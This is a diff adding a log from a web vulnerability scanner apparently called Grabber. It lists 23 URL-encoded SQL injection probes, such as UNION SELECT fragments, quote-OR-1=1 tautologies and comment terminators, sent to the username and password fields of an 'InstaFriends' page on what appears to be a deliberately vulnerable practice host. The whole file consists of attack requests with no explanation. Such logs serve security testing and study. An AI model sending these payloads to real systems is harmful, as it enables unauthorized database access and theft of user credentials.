@@ -1,0 +1,24 @@
+# Log from Grabber.py
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=1%27GRABBER_SQL_INJECTION
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=1%27+OR+1+OR+1%3D%27
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=OR+1%3D1
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=%22OR+%221%22%3D%221
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=%27%3B--
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?username=1%27+OR+1+OR+1%3D%27
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=1%27GRABBER_SQL_INJECTION
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=1%27+OR+1+OR+1%3D%27
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=OR+1%3D1
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=%22OR+%221%22%3D%221
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=%27%3B--
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password1=1%27+OR+1+OR+1%3D%27
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=1%27GRABBER_SQL_INJECTION
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=1%27+OR+1+OR+1%3D%27
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=OR+1%3D1
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=%22OR+%221%22%3D%221
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=%27%3B--
+http://34-214-183-135-instafriends.vulnerablesites.net/InstaFriends/?password2=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--
